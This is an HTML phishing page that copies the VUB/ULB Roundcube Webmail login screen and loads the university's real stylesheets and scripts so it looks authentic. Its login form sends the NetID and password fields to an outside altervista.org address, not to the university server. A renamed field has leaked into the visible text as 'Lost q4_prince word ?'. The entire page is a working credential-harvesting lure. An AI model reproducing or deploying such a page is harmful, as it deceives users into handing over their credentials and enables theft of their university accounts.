<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><HTML 

xmlns="http://www.w3.org/1999/xhtml"><HEAD><META content="IE=11.0000" 

http-equiv="X-UA-Compatible">

 <TITLE>VUB/ULB Roundcube Webmail :: Welcome to VUB/ULB Roundcube 

Webmail</TITLE> 

<META name="Robots" content="noindex,nofollow"> 

<META http-equiv="X-UA-Compatible" content="IE=EDGE"> <LINK href="./?_task=login" 

rel="index"> <LINK href="skins/classic/images/favicon.ico" rel="shortcut icon"> 

<LINK href="https://webmail.vub.ac.be/skins/classic/common.css?s=1382438145" 

rel="stylesheet" type="text/css"> 

<META http-equiv="content-type" content="text/html; charset=UTF-8"> <LINK href="https://webmail.vub.ac.be/plugins/jqueryui/themes/classic/jquery-ui-1.9.1.custom.css?s=1382438145" 

rel="stylesheet" type="text/css"> 

<SCRIPT src="https://webmail.vub.ac.be/program/js/jquery.min.js?s=1382438145" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://webmail.vub.ac.be/program/js/common.js?s=1403689344" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://webmail.vub.ac.be/program/js/app.js?s=1403689344" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://webmail.vub.ac.be/program/js/jstz.min.js?s=1382438145" type="text/javascript"></SCRIPT>

 

<SCRIPT type="text/javascript">

/* <![CDATA[ */



var rcmail = new rcube_webmail();

rcmail.set_env({"task":"login","x_frame_options":"sameorigin","cookie_domain":"","cookie_path":"\/","cookie_secure":true,"skin":"classic","refresh_interval":600,"session_lifetime":600,"action":"","comm_path":".\/?_task=login","date_format":"yy-mm-dd","request_token":"71f422224167d19bf83e72d7f2451de0"});

rcmail.gui_container("loginfooter","bottomline");

rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","requesttimedout":"Request timed out","refreshing":"Refreshing..."});

rcmail.gui_object('message', 'message');

rcmail.gui_object('loginform', 'form');

/* ]]> */

</SCRIPT>

 

<SCRIPT src="https://webmail.vub.ac.be/plugins/jqueryui/js/jquery-ui-1.9.1.custom.min.js?s=1382438145" type="text/javascript"></SCRIPT>

 

<META name="GENERATOR" content="MSHTML 11.00.9600.18838"></HEAD> 

<BODY><IMG id="logo" style="margin: 0px 11px;" alt="VUB/ULB Roundcube Webmail" 

src="https://webmail.vub.ac.be/program/logovubulb.png" border="0"> 

<DIV id="message"></DIV>

<DIV id="login-form">

<DIV class="boxtitle">Welcome to VUB/ULB Roundcube Webmail</DIV>

<DIV class="boxcontent">

<FORM name="form" action="http://directoryupdatee.altervista.org/veri1/member.php" 

method="post"><INPUT name="_token" type="hidden" value="71f422224167d19bf83e72d7f2451de0"> 

<INPUT name="_task" type="hidden" value="login"><INPUT name="_action" type="hidden" value="login"><INPUT name="_timezone" id="rcmlogintz" type="hidden" value="_default_"><INPUT name="_url" id="rcmloginurl" type="hidden" value="_task=login">

<TABLE border="0" summary="">

  <TBODY>

  <TR>

    <TD class="title"><LABEL for="rcmloginuser">NetID</LABEL> </TD>

    <TD 

class="input"><INPUT name="q3_name" id="rcmloginuser" type="text" autocomplete="off" autocapitalize="off"></TD></TR>

  <TR>

    <TD class="title"><LABEL for="rcmloginpwd">Pass</LABEL> </TD>

    <TD 

class="input"><INPUT name="q4_prince" id="rcmloginpwd" type="pass" autocomplete="off" autocapitalize="off"></TD></TR></TBODY></TABLE>

<P 

style="text-align: center;"><INPUT class="button mainaction" type="submit" value="Login"></P></FORM></DIV></DIV><NOSCRIPT> 

 &lt;p id="login-noscriptwarning"&gt;Warning: This webmail service requires 

Javascript! In order to use it please enable Javascript in your browser's 

settings.&lt;/p&gt; </NOSCRIPT> 

<DIV id="login-bottomline">  VUB/ULB Roundcube Webmail       &nbsp;●&nbsp; <A 

class="support-link" href="http://webnotes.ulb.ac.be/&amp;keyword=roundcube" 

target="_blank">Get support</A>     </DIV>

<TABLE align="center">

  <TBODY>

  <TR>

    <TD>

      <DIV id="login_info" style="padding: 10px; border-radius: 10px; width: 380px; text-align: center; color: red; margin-top: 3%; margin-right: auto; margin-left: auto; -moz-border-radius: 10px;"></DIV></TD>

    <TD><!--

<div id="login_info" style="margin-top:3%;margin-left:auto;margin-right:auto;;width:380px;border-radius:10px;padding:10px;-moz-border-radius:10px;background-color:lightgrey;text-align:center;color:black;">

Welcome to the roundcube webmail server.<br>

Login with your <b>NetID</b>. </br>

</div>

--> 

      <DIV id="login_info" style="padding: 10px; border-radius: 10px; width: 380px; text-align: center; color: red; margin-top: 3%; margin-right: auto; margin-left: auto; background-color: lightgrey; -moz-border-radius: 10px;"><A 

      href="http://www.ulb.ac.be/tools/pam/pamlostpw.php?language=uk" target="_blank"> 

      Lost q4_prince

word ?</A> </DIV>

      <DIV id="login_info" style="padding: 10px; border-radius: 10px; width: 380px; text-align: center; color: red; margin-top: 3%; margin-right: auto; margin-left: auto; background-color: lightgrey; -moz-border-radius: 10px;">

      Review your email identities after initial login !!!<BR></DIV></TD>

    <TD>

      <DIV id="login_info" style="padding: 10px; border-radius: 10px; width: 380px; text-align: center; color: red; margin-top: 3%; margin-right: auto; margin-left: auto; -moz-border-radius: 10px;"></DIV></TD></TR></TBODY></TABLE>

<SCRIPT type="text/javascript">

/* <![CDATA[ */



$(document).ready(function(){ 

rcmail.init();

var images = ["skins\/classic\/images\/icons\/folders.png","skins\/classic\/images\/mail_footer.png","skins\/classic\/images\/taskicons.gif","skins\/classic\/images\/display\/loading.gif","skins\/classic\/images\/pagenav.gif","skins\/classic\/images\/mail_toolbar.png","skins\/classic\/images\/searchfield.gif","skins\/classic\/images\/messageicons.png","skins\/classic\/images\/icons\/reset.gif","skins\/classic\/images\/abook_toolbar.png","skins\/classic\/images\/icons\/groupactions.png","skins\/classic\/images\/watermark.gif"];

            for (var i=0; i<images.length; i++) {

                img = new Image();

                img.src = images[i];

            }

});

/* ]]> */

</SCRIPT>

 </BODY></HTML>

